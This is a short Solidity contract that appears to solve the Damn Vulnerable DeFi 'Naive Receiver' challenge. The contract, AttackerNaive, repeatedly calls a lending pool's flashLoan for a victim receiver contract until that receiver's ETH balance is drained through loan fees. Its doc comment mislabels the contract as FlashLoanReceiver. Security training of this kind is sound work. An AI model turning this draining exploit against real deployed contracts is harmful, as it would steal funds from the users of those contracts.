// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackerNaive {
    NaiveReceiverLenderPool private immutable pool;
    FlashLoanReceiver private receiver;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _receiver) {
        pool = NaiveReceiverLenderPool(payable(_pool));
        receiver = FlashLoanReceiver(payable(_receiver));
    }

    function executeFlashLoan() external {
        while (address(receiver).balance > 0) {
            pool.flashLoan(receiver, ETH, 10 ether, bytes(""));
        }
    }
}
